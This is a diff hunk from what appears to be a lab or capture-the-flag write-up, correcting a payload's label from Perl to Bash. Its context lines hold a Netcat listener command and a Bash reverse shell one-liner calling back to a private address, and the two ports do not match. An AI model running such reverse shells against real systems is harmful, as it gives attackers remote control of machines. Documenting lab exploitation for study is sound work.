@@ -99,7 +99,7 @@ To move freely on the system, I leveraged the command injection to establish a r
 **Exploitation Steps:**
 
 1. **Listener:** Started a Netcat listener on my attacker machine: `nc -lvnp 1234`.
-2. **Payload:** Injected a Perl reverse shell payload into the command panel:
+2. **Payload:** Injected a Bash reverse shell payload into the command panel:
 
 &nbsp;   ```bash
     bash -c 'bash -i >& /dev/tcp/192.168.151.228/4444 0>&1'
